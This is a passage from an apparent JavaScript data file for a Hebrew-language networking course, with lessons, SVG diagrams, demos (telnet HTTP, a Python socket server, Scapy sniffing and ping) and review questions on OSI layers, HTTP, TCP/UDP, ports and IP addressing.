                  <defs><marker id="arr-n" markerWidth="5" markerHeight="5" refX="5" refY="2.5" orient="auto"><path d="M0,0 L5,2.5 L0,5z" fill="#0e7490"/></marker></defs>
                </svg>
              </div>
            </div>

            <div class="layer-card lc-2">
              <div class="lc-info">
                <div class="lc-num">2</div>
                <div class="lc-text">
                  <strong>שכבת קו (Data Link)</strong>
                  <span class="lc-proto">Ethernet · Wi-Fi · PPP</span>
                  <p>אחראית על העברה בין שני <em>צמתים סמוכים</em>. מארגנת Frames עם כתובות MAC ובדיקת שגיאות (CRC).</p>
                </div>
              </div>
              <div class="lc-viz">
                <svg viewBox="0 0 200 64" class="lc-svg">
                  <rect x="4" y="18" width="36" height="28" rx="3" fill="rgba(220,38,38,0.08)" stroke="#dc2626" stroke-width="1"/>
                  <text x="22" y="30" text-anchor="middle" font-size="6" fill="#dc2626" font-weight="bold">Preamble</text>
                  <text x="22" y="40" text-anchor="middle" font-size="5.5" fill="#dc2626">8 bytes</text>
                  <rect x="42" y="18" width="38" height="28" rx="3" fill="rgba(217,119,6,0.1)" stroke="#d97706" stroke-width="1"/>
                  <text x="61" y="30" text-anchor="middle" font-size="6" fill="#b45309" font-weight="bold">MAC dst</text>
                  <text x="61" y="40" text-anchor="middle" font-size="5.5" fill="#b45309">6 bytes</text>
                  <rect x="82" y="18" width="38" height="28" rx="3" fill="rgba(217,119,6,0.1)" stroke="#d97706" stroke-width="1"/>
                  <text x="101" y="30" text-anchor="middle" font-size="6" fill="#b45309" font-weight="bold">MAC src</text>
                  <text x="101" y="40" text-anchor="middle" font-size="5.5" fill="#b45309">6 bytes</text>
                  <rect x="122" y="18" width="32" height="28" rx="3" fill="rgba(8,145,178,0.1)" stroke="#0891b2" stroke-width="1"/>
                  <text x="138" y="30" text-anchor="middle" font-size="6" fill="#0e7490" font-weight="bold">Data</text>
                  <text x="138" y="40" text-anchor="middle" font-size="5.5" fill="#0e7490">46-1500B</text>
                  <rect x="156" y="18" width="38" height="28" rx="3" fill="rgba(5,150,105,0.1)" stroke="#059669" stroke-width="1"/>
                  <text x="175" y="30" text-anchor="middle" font-size="6" fill="#059669" font-weight="bold">FCS/CRC</text>
                  <text x="175" y="40" text-anchor="middle" font-size="5.5" fill="#059669">4 bytes</text>
                  <text x="100" y="58" text-anchor="middle" font-size="6" fill="rgba(15,23,42,0.4)">Ethernet Frame</text>
                </svg>
              </div>
            </div>

            <div class="layer-card lc-1">
              <div class="lc-info">
                <div class="lc-num">1</div>
                <div class="lc-text">
                  <strong>שכבה פיזית</strong>
                  <span class="lc-proto">Cat5e · Cat6 · Fiber · Wi-Fi · USB</span>
                  <p>מעבירה <em>ביטים</em> (0/1) כאותות חשמליים, אורים, או גלי רדיו. אין לה מושג מה המשמעות — רק פיזיקה.</p>
                </div>
              </div>
              <div class="lc-viz">
                <svg viewBox="0 0 200 64" class="lc-svg">
                  <line x1="14" y1="32" x2="186" y2="32" stroke="#475569" stroke-width="5" stroke-linecap="round"/>
                  <line x1="14" y1="32" x2="186" y2="32" stroke="rgba(8,145,178,0.35)" stroke-width="3" stroke-linecap="round"/>
                  <circle cx="14" cy="32" r="7" fill="rgba(8,145,178,0.15)" stroke="#0891b2" stroke-width="1.2"/>
                  <text x="14" y="35.5" text-anchor="middle" font-size="7" fill="#0e7490" font-weight="bold">TX</text>
                  <circle cx="186" cy="32" r="7" fill="rgba(5,150,105,0.15)" stroke="#059669" stroke-width="1.2"/>
                  <text x="186" y="35.5" text-anchor="middle" font-size="7" fill="#059669" font-weight="bold">RX</text>
                  <text x="45" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">0</text>
                  <text x="68" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">1</text>
                  <text x="91" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">1</text>
                  <text x="114" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">0</text>
                  <text x="137" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">1</text>
                  <text x="160" y="22" text-anchor="middle" font-size="11" font-family="monospace" fill="#0e7490" font-weight="bold">0</text>
                  <text x="100" y="56" text-anchor="middle" font-size="6.5" fill="rgba(15,23,42,0.4)">אות חשמלי / אור / גל רדיו</text>
                </svg>
              </div>
            </div>

          </div>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 3",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>Wireshark – הסנפה וניתוח. פרוטוקול = סט חוקים לתקשורת</li>
              <li>Encapsulation – הוספת Header. Decapsulation – הסרת Header</li>
              <li>מבנה פקטה: Ethernet + IP + TCP + Data. פילטרים: http, dns</li>
            </ul>
          </div>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: שימוש ב־Wireshark",
        content: `
          <p>ב־Wireshark: בוחרים ממשק (כרטיס רשת), לוחצים Start. התעבורה מופיעה ברשימה. <strong>פילטר</strong> – בשדה Filter להקליד למשל: <code>http</code> (רק HTTP), <code>dns</code> (רק DNS), <code>ip.addr==192.168.1.1</code> (חבילות שמכילות את הכתובת). לוחצים Enter. כל שורה = חבילה. לחיצה על חבילה מציגה את המבנה לפי שכבות – Ethernet, IP, TCP, HTTP.</p>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 3",
        questions: [
          {
            q: "מה היתרון של מודל השכבות?",
            a: "כל שכבה אינה תלויה במימוש של שכבה אחרת. אם ישנו כבל, תוכנה, או פרוטוקול בשכבה אחת – השאר לא מושפע. זה מאפשר עדכונים והתפתחות ללא שבירת כל המערכת."
          },
          {
            q: "למה משתמשים בחמש שכבות ולא בשבע?",
            a: "מודל שבע השכבות (OSI) נוצר באופן תיאורטי. מודל חמש השכבות נוצר מתוך השימוש בפועל ברשת האינטרנט – שתי שכבות (הצגה וסשן) התגלו כמיותרות והושמטו."
          },
          {
            q: "מה ההבדל בין Encapsulation ל-Decapsulation?",
            a: "Encapsulation – בשליחה: כל שכבה מוסיפה Header (תחילית) לפקטה ומעבירה למטה. Decapsulation – בקבלה: כל שכבה מסירה את ה-Header שלה ומעבירה את השאר למעלה."
          }
        ]
      }
    ]
  },
  {
    id: 4,
    title: "שכבת האפליקציה",
    pages: [
      {
        type: "explanation",
        title: "מהי שכבת האפליקציה?",
        content: `
          <p>שכבת האפליקציה היא אוסף הפרוטוקולים בהם עושות האפליקציות שימוש באופן ישיר. היא מספקת הפשטה מעל תקשורת הנתונים ברשת – דפדפנים, WhatsApp, Gmail, Facebook – כולם משתמשים בפרוטוקולים של שכבת האפליקציה.</p>
        `
      },
      {
        type: "explanation",
        title: "פרוטוקול HTTP – בקשה ותגובה",
        content: `
          <p><strong>HTTP</strong> הוא הפרוטוקול הנפוץ ביותר לשכבת האפליקציה – גלישה באינטרנט. הוא משתמש בעקרון "בקשה-תגובה": הלקוח שולח בקשה, השרת מחזיר תגובה.</p>
          <p><strong>שורת הבקשה</strong> למשל: <code>GET /hypertext/WWW/TheProject.html</code> – המילה GET מציינת בקשת הבאה של פריט מידע.</p>
          <p><strong>שורת התגובה</strong>: <code>HTTP/1.1 200 OK</code> – גרסת הפרוטוקול, קוד מצב (200 = בסדר), וסוג התוכן.</p>
        `
      },
      {
        type: "explanation",
        title: "מבנה פורמלי של HTTP – שורות ו־Headers",
        content: `
          <p>הודעת HTTP בנויה מ־<strong>שורות טקסט</strong> שמופרדות ב־<code>\\r\\n</code> (CRLF – Carriage Return + Line Feed). שורה ריקה מפרידה בין ה־Headers לגוף ההודעה.</p>
          <p><strong>שורת בקשה:</strong> <code>METHOD URL HTTP/VERSION</code> – למשל <code>GET /index.html HTTP/1.1</code>. ה־<strong>URL</strong> כאן הוא path יחסי (ללא הדומיין – השרת כבר ידוע מהחיבור).</p>
          <p><strong>Headers</strong> – כל שורה בפורמט <code>שם: ערך</code>. דוגמאות: Host: www.example.com, User-Agent: Mozilla/5.0, Accept-Language: he.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: שימוש ב־telnet לבקשת HTTP",
        content: `
          <p>ב־telnet אפשר להתחבר ידנית לשרת HTTP ולשלוח בקשה. הנה מה שמקלידים ומה שמתקבל:</p>
          <div class="code-preview">
            <pre><code>$ telnet www.example.com 80
GET / HTTP/1.0
Host: www.example.com

HTTP/1.1 200 OK
Content-Type: text/html
...</code></pre>
          </div>
          <p class="demo-note">📋 מתחברים לפורט 80, כותבים GET + path + גרסה. שורה ריקה מסמנת סוף ה־Headers. השרת מחזיר תגובה עם קוד 200 וה־HTML.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: שרת HTTP פשוט בפייתון",
        content: `
          <p>זה הקוד לשרת HTTP מינימלי שמחזיר דף קבוע:</p>
          <div class="code-preview">
            <pre><code>import socket
s = socket.socket()
s.bind(('0.0.0.0', 8080))
s.listen(1)
(client, addr) = s.accept()
data = client.recv(1024)  # הבקשה (bytes)
response = 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n&lt;h1&gt;שלום!&lt;/h1&gt;'
client.send(response.encode())   # חייב bytes!
client.close()</code></pre>
          </div>
          <p class="demo-note">📋 השרת מאזין, מקבל בקשה, ומחזיר שורת תגובה + Headers + גוף HTML. <code>\r\n</code> מפריד בין השורות. <code>.encode()</code> ממיר את ה-string ל-bytes לפני שליחה.</p>
        `
      },
      {
        type: "explanation",
        title: "קודי HTTP ומבנה Headers",
        content: `
          <p>קודי תגובה: <strong>200</strong> OK – הצלחה. <strong>301</strong> Moved Permanently – הפניה. <strong>404</strong> Not Found – לא נמצא. <strong>500</strong> Server Error – שגיאה בשרת. רשימה מלאה: <a href="http://goo.gl/COC4J7" target="_blank">קודי HTTP</a></p>
          <p>מעבר לשורת הבקשה/תגובה, יש <strong>Headers</strong> – שדות מידע (שם:ערך). למשל: Accept-Language: he (עברית), User-Agent (סוג הדפדפן), Content-Length (גודל הגוף), Content-Type (סוג התוכן).</p>
        `
      },
      {
        type: "explanation",
        title: "פרוטוקול DNS",
        content: `
          <p><strong>DNS</strong> (Domain Name System) ממיר שמות כמו <code>www.google.com</code> לכתובות IP. הדפדפן לא יודע איך לפנות ל־"google.com" – צריך IP. שרת ה־DNS (שכתובתו מתקבלת מ־DHCP) עונה על שאילתות ומחזיר את ה־IP.</p>
          <p>פקודת <code>nslookup www.google.com</code> מבצעת שאילתת DNS ומציגה את הכתובת.</p>
        `
      },
      {
        type: "explanation",
        title: "בקשות GET ו-POST",
        content: `
          <p><strong>GET</strong> – הבאת מידע, הפרמטרים ב־URL. <strong>POST</strong> – שליחת מידע (טופס, תמונה), התוכן בגוף הבקשה. אורך URL מוגבל (~2000 תווים) – לכן העלאת תמונה לא אפשרית ב־GET.</p>
        `
      },
      {
        type: "explanation",
        title: "משאבי רשת – URL מלא",
        content: `
          <p><strong>URL</strong> (Uniform Resource Locator) מזהה משאב ברשת. מבנה: <code>פרוטוקול://דומיין:פורט/נתיב?שאילתה</code>. לדוגמה: <code>https://www.google.com/maps?q=תל+אביב</code> – פרוטוקול HTTPS, דומיין Google, נתיב maps, פרמטר q למקום.</p>
          <p>כל משאב ברשת (דף, תמונה, API) מזוהה ב־URL ייחודי. מפות Google, סרטונים, טפסים – כולם נגישים דרך URLs.</p>
        `
      },
      {
        type: "explanation",
        title: "מפות Google – דוגמה למשאבי רשת",
        content: `
          <p>כשפותחים מפות Google ומחפשים מקום – הדפדפן שולח בקשות HTTP לשרתי Google. ה־URL משתנה לפי החיפוש: <code>https://www.google.com/maps/search/...</code>. השרת מחזיר מפות, תמונות, נתונים. זוהי דוגמה לשכבת האפליקציה – פרוטוקול HTTP משרת את היישום (מפות) שמציג מידע למשתמש.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 4",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>שכבת האפליקציה = פרוטוקולים שהאפליקציות משתמשות בהם ישירות</li>
              <li>HTTP = פרוטוקול בקשה-תגובה. מבנה: שורות מופרדות ב־\\r\\n, שורה ריקה לפני גוף</li>
              <li>בקשה: METHOD URL HTTP/VERSION, Headers (שם:ערך), גוף (אם יש)</li>
              <li>GET – הבאה, POST – שליחה. URL מזהה משאב: פרוטוקול://דומיין/נתיב</li>
              <li>telnet + ידני או שרת Python = בדיקת HTTP</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 4",
        questions: [
          {
            q: "מה ההבדל בין בקשת GET לבקשת אחרת?",
            a: "GET נועדה להביא פריט מידע מהשרת – בדרך כלל דף אינטרנט. אין תוכן בגוף הבקשה. בקשות אחרות (כמו POST) משמשות לשליחת מידע לשרת – למשל טופס התחברות."
          },
          {
            q: "מה אומר קוד 404?",
            a: "404 Not Found – המשאב המבוקש (דף, קובץ) לא נמצא בשרת. זה הקוד המפורסם שמציגים כשנכנסים לכתובת שלא קיימת."
          },
          {
            q: "למה צריך \\r\\n בהודעות HTTP?",
            a: "HTTP מוגדר כפרוטוקול טקסט. שורות מופרדות ב־CRLF (\\r\\n). שורה ריקה מסמנת סוף ה־Headers ותחילת הגוף. זה מאפשר לשרת וללקוח לפרסר את ההודעה בצורה אחידה."
          }
        ]
      }
    ]
  },
  {
    id: 5,
    title: "Scapy",
    pages: [
      {
        type: "explanation",
        title: "מבוא ל-Scapy",
        content: `
          <p><strong>Scapy</strong> היא ספרייה חיצונית לפייתון שמאפשרת הסנפה, שליחה וייצור חבילות רשת, וניתוח שדות – ברמת השכבות הנמוכות. בניגוד ל־Sockets שמשרת את שכבת האפליקציה, Scapy מאפשרת גישה לשכבות התעבורה, הרשת והקו.</p>
          <p>באמצעות Scapy אפשר להסניף תעבורת HTTP ולשמור את כל הכתובות שאליהן הייתה גלישה, לסנן לפי תנאים, לראות תמונות שעברו, ולשלוח חבילות עם מבנה בשליטה מלאה.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: הסנפה בסיסית ב-Scapy",
        content: `
          <p>פונקציית <code>sniff</code> מבצעת הסנפה. הנה דוגמה לפלט:</p>
          <div class="code-preview">
            <pre><code>&gt;&gt;&gt; packets = sniff(count=2)
&gt;&gt;&gt; packets
&lt;Sniffed: TCP:2 UDP:0 ICMP:0 Other:0&gt;
&gt;&gt;&gt; packets[0]
&lt;Ether ...&gt;&lt;IP ...&gt;&lt;TCP ...&gt;</code></pre>
          </div>
          <p class="demo-note">📋 Scapy מציג סיכום סוגי החבילות. אפשר לגשת לכל חבילה כרשימה ולנתח את השדות של כל שכבה (Ethernet, IP, TCP).</p>
        `
      },
      {
        type: "explanation",
        title: "סינון חבילות – lfilter",
        content: `
          <p>ניתן לסנן חבילות בהסנפה באמצעות פרמטר <code>lfilter</code> – פונקציה שמקבלת חבילה ומחזירה True/False. לדוגמה, לסנן רק חבילות DNS:</p>
          <div class="code-preview">
            <pre><code>def filter_dns(packet):
    return DNS in packet

packets = sniff(count=10, lfilter=filter_dns)</code></pre>
          </div>
          <p>Scapy מלווה את הספר – משמש לכתיבת ping, traceroute, ובדיקת שירותים במחשב מרוחק.</p>
        `
      },
      {
        type: "explanation",
        title: "בניית חבילות – IPv4, TCP, ICMP",
        content: `
          <p>Scapy מאפשר לבנות חבילות משכבות שונות. כל שכבה = קלאס: <code>IP()</code>, <code>TCP()</code>, <code>ICMP()</code>, <code>Ether()</code>. מחברים בשכבתיות: <code>p = IP(dst="8.8.8.8")/ICMP()</code> – חבילת ping. <code>/</code> מציין "השכבה הבאה היא payload של הקודמת".</p>
          <p>אפשר לקבוע שדות: <code>IP(dst="1.2.3.4", ttl=5)</code>, <code>TCP(dport=80, flags="S")</code> (S = SYN).</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: שליחת חבילות",
        content: `
          <p>לאחר בניית חבילה, שולחים עם <code>send</code> (שכבת 2–3) או <code>sr</code> (send and receive – מחכה לתשובה):</p>
          <div class="code-preview">
            <pre><code>&gt;&gt;&gt; p = IP(dst="8.8.8.8")/ICMP()
&gt;&gt;&gt; sr1(p)
&lt;IP  version=4 ... |&lt;ICMP  type=echo-reply ...&gt;&gt;</code></pre>
          </div>
          <p class="demo-note">📋 sr1 שולח חבילה ומחזיר את התשובה הראשונה. אפשר לגשת לשדות: <code>ans[IP].ttl</code>, <code>ans[ICMP].type</code>. כך בונים ping, traceroute (עם TTL עולה), וסורקי פורטים.</p>
        `
      },
      {
        type: "explanation",
        title: "הסנפה מתקדמת – פרטי שדות",
        content: `
          <p>לאחר sniff, כל חבילה מכילה שדות של כל שכבה: <code>p[IP].src</code>, <code>p[IP].dst</code>, <code>p[TCP].sport</code>, <code>p[TCP].dport</code>, <code>p.haslayer(DNS)</code>. אפשר לחלץ URL מ־חבילות HTTP, כתובות DNS, ונתונים נוספים לניתוח.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק Scapy",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>Scapy = ספריית Python להסנפה, שליחה וייצור חבילות ברמת השכבות הנמוכות</li>
              <li>sniff() – הסנפה, lfilter – סינון לפי תנאי. גישה לשדות: p[IP].src, p[TCP].dport</li>
              <li>בניית חבילות: IP()/ICMP(), IP()/TCP() – / מחבר שכבות. send, sr, sr1 לשליחה</li>
              <li>מאפשר ping, traceroute, סריקת פורטים – טיפול תוכנתי מלא בחבילות</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק Scapy",
        questions: [
          {
            q: "מה ההבדל בין Wireshark ל-Scapy?",
            a: "Wireshark הוא כלי צפייה – מסונף ומציג. Scapy מאפשר גם הסנפה, אבל בתוך קוד פייתון – אפשר לסנן, לעבד, לשמור, לשלוח חבילות ולבצע פעולות מורכבות על הנתונים."
          },
          {
            q: "מה עושה האופרטור / ב-Scapy?",
            a: "האופרטור / מחבר שכבות – השכבה הימנית נעטפת כ-payload של השמאלית. IP()/ICMP() יוצר חבילת ping. IP()/TCP(dport=80) יוצר חבילת TCP לפורט 80."
          }
        ]
      }
    ]
  },
  {
    id: 6,
    title: "שכבת התעבורה",
    pages: [
      {
        type: "explanation",
        title: "תפקיד שכבת התעבורה",
        content: `
          <p>שכבת התעבורה אחראית להעביר מידע מתכנית (תהליך) לתכנית מרוחקת. לה שתי מטרות עיקריות:</p>
          <ul>
            <li><strong>ריבוב אפליקציות</strong> – לתקשר עם ישות אחת (כתובת IP) ולהשתמש בכמה שירותים – כך שהישות תדע להבדיל איזה זרם מידע שייך לאיזה שירות.</li>
            <li><strong>העברה אמינה</strong> (אופציונלית) – לא כל פרוטוקול בשכבת התעבורה מספק זאת.</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "פורטים (Ports)",
        content: `
          <p>מזהה התוכנה על השרת נקרא <strong>פורט</strong>. כתובת IP = הבניין, פורט = הדירה. בפניה לפורט מסוים, השרת יודע לאיזו תוכנה פונים.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 320 100" class="content-diagram">
              <rect x="40" y="10" width="120" height="80" rx="6" fill="var(--bg-elevated)" stroke="var(--accent)"/>
              <text x="100" y="35" text-anchor="middle" font-size="11" fill="var(--text)">שרת</text>
              <text x="100" y="50" text-anchor="middle" font-size="9" fill="var(--text-muted)">IP: 192.168.1.1</text>
              <rect x="50" y="58" width="35" height="22" rx="2" fill="var(--accent-soft)"/><text x="67" y="73" text-anchor="middle" font-size="9">:80</text>
              <rect x="90" y="58" width="35" height="22" rx="2" fill="var(--accent-soft)"/><text x="107" y="73" text-anchor="middle" font-size="9">:443</text>
              <rect x="130" y="58" width="35" height="22" rx="2" fill="var(--accent-soft)"/><text x="147" y="73" text-anchor="middle" font-size="9">:25</text>
              <text x="55" y="85" text-anchor="middle" font-size="8" fill="var(--text-muted)">HTTP</text>
              <text x="107" y="85" text-anchor="middle" font-size="8" fill="var(--text-muted)">HTTPS</text>
              <text x="147" y="85" text-anchor="middle" font-size="8" fill="var(--text-muted)">אימייל</text>
            </svg>
            <p class="diagram-caption">IP = בניין, פורט = דירה. כל שירות מאזין על פורט אחר</p>
          </div>
          <p>לדוגמה: פורט 80 (ב־TCP) = שירות HTTP. אם נשלח הודעה לפורט 80, השרת מבין שמדובר בבקשת דף אינטרנט.</p>
          <p><strong>פורט פתוח</strong> = פורט שתוכנה מאזינה עליו וממוכנה לקבל חיבורים.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: פלט של פקודת netstat",
        content: `
          <p>כשרצים <code>netstat</code>, זה סוג הפלט שמופיע – הנה דוגמה:</p>
          <div class="code-preview">
            <pre><code>פרוטוקול   כתובת מקומית        כתובת רחוקה         מצב
TCP        127.0.0.1:5354       0.0.0.0:0           האזנה
TCP        0.0.0.0:80           0.0.0.0:0           האזנה
TCP        192.168.1.5:49160    users-pc:8820      מחובר</code></pre>
          </div>
          <p class="demo-note">📋 <strong>כתובת מקומית</strong> – ה־IP והפורט שעליהם המחשב מאזין. למשל <code>0.0.0.0:80</code> = שירות HTTP פתוח. <strong>מצב האזנה</strong> = פורט שמחכה לחיבורים. <strong>מחובר</strong> = חיבור פעיל.</p>
        `
      },
      {
        type: "explanation",
        title: "TCP לעומת UDP",
        content: `
          <p><strong>TCP</strong> – פרוטוקול אמין. מבטיח שכל המידע יגיע, בסדר הנכון. דורש Handshake לפני שליחה. מתאים לדפדפן, אימייל, העברת קבצים.</p>
          <p><strong>UDP</strong> – פרוטוקול קל ומהיר. בלי ערבויות – זורק חבילות ומקווה שיגיעו. מתאים לשיחות וידאו/קול (Zoom, Discord), משחקים מרובי משתתפים, ו-DNS. שימו לב: Netflix ו-YouTube משתמשים ב-TCP — עדיף buffer קצר על שגיאות. UDP מתאים כשעיכוב חשוב יותר משלמות הנתונים.</p>
        `
      },
      {
        type: "explanation",
        title: "TCP Handshake – שלושת השלבים",
        content: `
          <p>לפני העברת מידע, TCP מבצע <strong>Handshake</strong> בן שלושה שלבים: (1) לקוח שולח <strong>SYN</strong> – "אני רוצה להתחבר". (2) שרת עונה <strong>SYN-ACK</strong> – "מאושר, מתחברים". (3) לקוח שולח <strong>ACK</strong> – "קיבלתי". רק אז מתחילה העברת המידע. סגירה: FIN או RST.</p>
          <p><strong>דגלים (Flags)</strong>: SYN, ACK, FIN, RST, PSH. כל דגל = ביט שמפעיל התנהגות.</p>
        `
      },
      {
        type: "simulation",
        title: "הדמיית TCP Handshake",
        simId: "tcpHandshake",
        content: `<p>לחצי "הרץ הדמיה" כדי לראות את שלושת השלבים בזרימה – SYN, SYN-ACK, ACK.</p>`
      },
      {
        type: "explanation",
        title: "Sequence number ו־Acknowledgment",
        content: `
          <p><strong>Sequence Number</strong> – מזהה את סדר הבייטים ששולחים. כל צד מתחיל מספר אקראי ומספר כל בייט שנשלח. <strong>Acknowledgment</strong> – "קיבלתי עד X, שלח את הבא". כך TCP מאשר קבלה ומזהה אובדן – אם ACK לא מגיע, שולחים שוב.</p>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 6",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>שכבת התעבורה = העברה מתהליך לתהליך מרוחק</li>
              <li>פורט = מזהה התוכנה על השרת. netstat מציג פורטים פתוחים וחיבורים</li>
              <li>TCP Handshake: SYN → SYN-ACK → ACK. דגלים: SYN, ACK, FIN, RST</li>
              <li>Sequence number ו־Acknowledgment – זיהוי סדר ואובדן</li>
              <li>TCP = אמין, UDP = מהיר בלי ערבויות</li>
            </ul>
          </div>
        `
      },
      {
        type: "explanation",
        title: "פורטים ידועים ו־Ephemeral",
        content: `
          <p><strong>פורטים ידועים</strong> (0–1023): 80=HTTP, 443=HTTPS, 25=SMTP, 53=DNS. השרת מאזין על אלה. <strong>Ephemeral</strong> (חולף) – פורטים דינמיים שהלקוח מקבל (למשל 49152–65535). בכל חיבור הלקוח משתמש בפורט מקור אקראי, השרת עונה לאותו פורט.</p>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 6",
        questions: [
          {
            q: "למה צריך פורטים אם יש כבר כתובת IP?",
            a: "כתובת IP מזהה את המחשב. אבל שרת אחד יכול להריץ שירות אימייל, שירות HTTP, שירות FTP ועוד. כל שירות מאזין על פורט שונה. בלעדי הפורט, השרת לא היה יודע לאיזו תוכנה להפנות את הבקשה."
          },
          {
            q: "מתי נבחר TCP ומתי UDP?",
            a: "TCP כש צריך שכל המידע יגיע בדיוק – דפים, קבצים, אימייל. UDP כשזמנים אמיתיים חשובים יותר מהשלמות – שיחת וידאו שעדיף פריים חסר מאשר עיכוב."
          },
          {
            q: "מה תפקיד ה־Handshake ב־TCP?",
            a: "ה־Handshake (SYN, SYN-ACK, ACK) יוצר חיבור אמין לפני העברת מידע. שני הצדדים מאשרים שהם מוכנים לתקשורת. בלי Handshake, אי אפשר לדעת אם הצד השני קלט את החבילות."
          }
        ]
      }
    ]
  },
  {
    id: 7,
    title: "שכבת הרשת",
    pages: [
      {
        type: "explanation",
        title: "תפקיד שכבת הרשת",
        content: `
          <p>שכבת התעבורה מניחה שאפשר להעביר חבילה ממחשב א' למחשב ב'. <strong>שכבת הרשת</strong> היא האחראית לתהליך זה.</p>
          <p>מטרת שכבת הרשת: להעביר חבילות מידע (Packets) מישות אחת לאחרת. ברשת האינטרנט המידע צריך לעבור דרך רכיבים רבים – נתבים, שרתים – עד שהוא מגיע ליעד. שכבת הרשת דואגת להעביר את החבילות בין כל הרכיבים האלה.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 360 100" class="content-diagram">
              <rect x="20" y="30" width="50" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="55" text-anchor="middle" font-size="10">מחשב</text>
              <circle cx="95" cy="50" r="12" fill="var(--accent-green)" stroke="var(--accent)"/>
              <text x="95" y="54" text-anchor="middle" font-size="8">נתב</text>
              <circle cx="155" cy="50" r="12" fill="var(--accent-green)" stroke="var(--accent)"/>
              <text x="155" y="54" text-anchor="middle" font-size="8">נתב</text>
              <path d="M 75 50 L 83 50 M 107 50 L 143 50 M 167 50 L 215 50" stroke="var(--accent)" stroke-width="2"/>
              <circle cx="235" cy="50" r="12" fill="var(--accent-green)" stroke="var(--accent)"/>
              <text x="235" y="54" text-anchor="middle" font-size="8">נתב</text>
              <path d="M 247 50 L 295 50" stroke="var(--accent)" stroke-width="2"/>
              <rect x="305" y="30" width="50" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="330" y="55" text-anchor="middle" font-size="10">שרת</text>
            </svg>
            <p class="diagram-caption">חבילות עוברות דרך נתבים בדרך ליעד</p>
          </div>
        `
      },
      {
        type: "explanation",
        title: "חבילות (Packets)",
        content: `
          <p>המידע מחולק לחבילות. בשכבת הרשת קוראים להן <strong>Packets</strong> (פקטות). כל חבילה מכילה את המידע + מידע על כתובת המקור והיעד, כדי שהרכיבים בדרך ידעו לאן להעביר אותה.</p>
          <p>רוב המידע באינטרנט מועבר בשכבת הרשת, לכן נוהגים לקרוא לכל מידע כזה "פקטה".</p>
        `
      },
      {
        type: "explanation",
        title: "מבנה חבילת IP – Header ושדות",
        content: `
          <p>חבילת IP כוללת <strong>IP Header</strong> + Data. ה־Header מכיל: <strong>Source IP</strong>, <strong>Destination IP</strong>, TTL (Time To Live – מפחית בכל hop, מונע לולאות), Protocol (TCP=6, UDP=17, ICMP=1), Checksum, ועוד. הגודל המינימלי של Header = 20 בתים.</p>
        `
      },
      {
        type: "explanation",
        title: "מסכת רשת (Subnet Mask) ו־Default Gateway",
        content: `
          <p><strong>Subnet Mask</strong> (למשל 255.255.255.0) קובע אילו ביטים ב־IP שייכים לרשת המקומית. ב־AND לוגי עם ה־IP מתקבלת כתובת הרשת. כתובת ב־רשת אחרת = שולחים ל־<strong>Default Gateway</strong> – הנתב המקומי שמחבר לרשתות אחרות. בלי Default Gateway אין יציאה לאינטרנט.</p>
        `
      },
      {
        type: "explanation",
        title: "ICMP, DHCP ו-NAT",
        content: `
          <p><strong>ICMP</strong> – פרוטוקול לשגיאות והודעות. ping שולח Echo Request, מקבל Echo Reply. TTL (Time To Live) – כל נתב מפחית; אם מגיע 0 החבילה נזרקת ו-ICMP Time Exceeded נשלח (traceroute משתמש בזה).</p>
          <p><strong>DHCP</strong> – מחשב חדש: Discover (ברודקסט) → שרת שולח Offer (IP, Subnet, Gateway, DNS) → Request → Ack. המחשב מקבל הגדרות אוטומטית.</p>
          <p><strong>NAT</strong> – כתובות פרטיות (10.x, 172.16.x, 192.168.x) לא ניתנות לניתוב. הנתב מחליף כתובת מקור + פורט מקור ל-IP הציבורי + פורט ייחודי (PAT). בתשובה – מחליף חזרה לפי טבלת התרגום.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – שכבת הרשת",
        intro: "<p>זוויות מפתיעות על רשתות:</p>",
        blocks: [
          {
            title: "למה ה־IP נגמר? IPv4 vs IPv6",
            icon: "🌐",
            content: `
              <p>IPv4 = 2^32 כתובות (~4.3 מיליארד). נראה הרבה – אבל האינטרנט גדל. IPv6 = 2^128 כתובות – מספיק לכל גרגר חול על כדור הארץ ועוד. החשיבה מחוץ לקופסא: NAT מאפשר למיליוני מחשבים "להסתדר" עם IP אחד – אבל זה מסתיר בעיה. IPv6 פותר את זה מהשורש.</p>
            `
          },
          {
            title: "האם אפשר לרשת את העולם בסיב אופטי אחד?",
            icon: "📡",
            content: `
